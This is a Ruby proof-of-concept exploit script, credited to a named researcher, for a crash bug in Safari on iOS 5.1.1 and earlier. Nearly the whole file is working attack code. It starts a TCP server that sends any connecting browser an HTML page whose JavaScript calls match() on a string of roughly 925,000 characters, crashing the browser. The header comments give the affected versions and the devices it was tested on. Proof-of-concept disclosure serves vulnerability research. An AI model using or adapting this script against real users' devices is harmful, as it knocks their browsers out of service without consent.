#!/usr/bin/env ruby

# - Title
# iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC

# - Author
# Alberto Ortega @a0rtega
# alberto[@]pentbox[.]net

# - Summary
# A vulnerability has been discovered in Apple Safari Browser
# included in the last version of iOS (5.1.1).
#
# Previous versions may be affected too.
#
# When JavaScript function match() gets a big buffer as
# parameter the browser unexpectedly crashes.
#
# By extension, the function search() is affected too.
#
# Tested on iOS 5.0.1, 5.1.0, 5.1.1
# Tested on iPod Touch, iPhone and iPad iOS devices.

require "socket"
require "optparse"

# Buffer values
chr = "A"
# The size of buffer needed may vary depending
# on the device and the iOS version.
buffer_len = 925000

# Magic packet
body = "\
<html>\n\
<head><title>Crash PoC</title></head>\n\
<script type=\"text/javascript\">\n\
var s = \"poc\";\n\
s.match(\"#{chr*buffer_len}\");\n\
</script>\n\
</html>";

def help()
	puts "iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC"
	puts "#{$0} -p bind_port [-h bind_address] [--verbose]"
end

# Parsing options
opts = {}
optparser = OptionParser.new do |op|
	op.on("-h", "--host HOST") do |p|
		opts["host"] = p
	end
	op.on("-p", "--port PORT") do |p|
		opts["port"] = p
	end
	op.on("-v", "--verbose") do |p|
		opts["verbose"] = true
	end
end

begin
	optparser.parse!
rescue
	help()
	exit 1
end

if (opts.length == 0 || opts["port"] == nil)
	help()
	exit 1
end

if (opts["verbose"] != nil)
	debug = true
else
	debug = false
end
if (opts["host"] != nil)
	host = opts["host"]
else
	host = "0.0.0.0"
end
port = opts["port"]

# Building server
if debug
	puts "Buffer -> #{chr}*#{buffer_len}"
end

begin
	serv = TCPServer.new(host, port)
	puts "Listening on #{host}:#{port.to_s} ..."
rescue
	puts "Error listening on #{host}:#{port.to_s}"
	exit 1
end

begin
	s = serv.accept()
	if debug
		puts "Client connected, waiting petition ..."
	end
	data = s.recv(1000)
	if debug
		puts "Sending crafted packet ..."
	end
	s.print(body)
	if debug
		puts "Closing connection ..."
	end
	s.close()
	puts "Done!"
rescue
	puts "Error sending data"
	exit 1
end